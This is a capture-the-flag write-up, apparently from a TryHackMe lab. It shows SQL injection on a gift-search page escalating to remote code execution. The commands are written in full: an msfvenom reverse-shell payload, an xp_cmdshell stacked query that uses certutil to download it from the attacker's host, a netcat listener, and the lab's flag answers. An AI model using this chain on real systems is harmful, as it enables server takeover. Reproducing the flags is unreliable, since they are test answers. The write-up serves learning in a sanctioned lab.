# SQL injection

I went through a challenge description to learn about SQL injection. Went through few videos online to get a better understanding. So let's try restoring the defaced website.
Going to the gift search feature of the website we can identify some interesting URL query parameters by looking at the URL in our browser. 
- **`http://MACHINE_IP/giftresults.php?age=child&interests=toys&budget=30`**

The underlying PHP code is taking in the three parameters we specified for age, interests, and budget (as separated by the & character) and querying the database to retrieve the filtered results and output them to the page
We can try give submiting **`'`** in the SQL query and try generating a syntax error. We can do so as
- **`http://MACHINE_IP/giftresults.php?age='&interests=toys&budget=30`**

This generates an error message as shown below.

![Screenshot (114)](https://github.com/Wixter07/HARSHITH-JTP-2/assets/150792650/071a4e45-a416-4310-a568-70474558c674)

We can further transform the query as **`http://MACHINE_IP/giftresults.php?age=' OR 1=1 --`** to reveal all the gifts in the data. We also seem to get a flag at the end of this page.

![Screenshot (115)](https://github.com/Wixter07/HARSHITH-JTP-2/assets/150792650/a41cdd4a-04d9-41dd-93cb-da9361ed68f4)

We'll try Remote Code Execution and create a payload in order for us to upload this payload to the server and then we can listen using netcat.
We'll use MSFvenom for payload generation as 
- **`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.69.106 LPORT=4444 -f exe -o reverse.exe`**
Now we'll setup a server to host this payload as
- **`python3 -m http.server 8000`**

![image](https://github.com/Wixter07/HARSHITH-JTP-2/assets/150792650/15b615fd-eb3e-4927-aa06-f7ff61a7af82)

- Now we'll use our stacked query to call **xp_cmdshell** and execute the **certutil.exe** command on the target to download our payload as
  - **`http://10.10.67.10/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.69.106:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --`**
- We'll go to the URL to GET the response.
- Then we'll setup a listen using netcat as
  - **`nc -lnvp 4444`**
- Now, we can run one final stacked query to execute the reverse.exe file we previously saved in the C:\Windows\Temp directory by the URL
  - **`http://10.10.69.106/giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --`**

Now we get access to that machine. We'll try to restore the website by going to the **Users** directory and list  out its contents using **dir** . We can see a user named **Administrator**.

![Screenshot (117)](https://github.com/Wixter07/HARSHITH-JTP-2/assets/150792650/dfe67845-c449-4b7c-89b7-c573cfdbf96c)

Going to this user directory and listing out its contents, we then go to the **Desktop** directory where upon listing its contents, we get to see a **restore_website.bat** file which when executed restores the website.

![Screenshot (118)](https://github.com/Wixter07/HARSHITH-JTP-2/assets/150792650/67bbeecd-3e26-4a48-9327-cb5053b2a0fd)

Now we get a flag on going to the home page of the website.

![Screenshot (119)](https://github.com/Wixter07/HARSHITH-JTP-2/assets/150792650/032bd5f3-7e3b-4615-97a6-f2e3ced82e61)

## Manually navigate the defaced website to find the vulnerable search form. What is the first webpage you come across that contains the gift-finding feature?

This can be answered by looking at the URL after going to the Gift Search section in the website.

**Ans- `/giftsearch.php`**

## Analyze the SQL error message that is returned. What ODBC Driver is being used in the back end of the website?

Answer can be found in the error message generated.

**Ans- `ODBC Driver 17 for SQL Server`**

## Inject the 1=1 condition into the Gift Search form. What is the last result returned in the database?

This we had already found

**Ans- `THM{a4ffc901c27fb89efe3c31642ece4447}`**


## What flag is in the note file Gr33dstr left behind on the system?

Just above the **restore_website.bat** file, there is a **Note.txt** text file. We can read out the file using **`type Note.txt`** to get the flag.

**Ans- `THM{b06674fedd8dfc28ca75176d3d51409e}`**

## What is the flag you receive on the homepage after restoring the website?

**Ans- `THM{4cbc043631e322450bc55b42c}`**
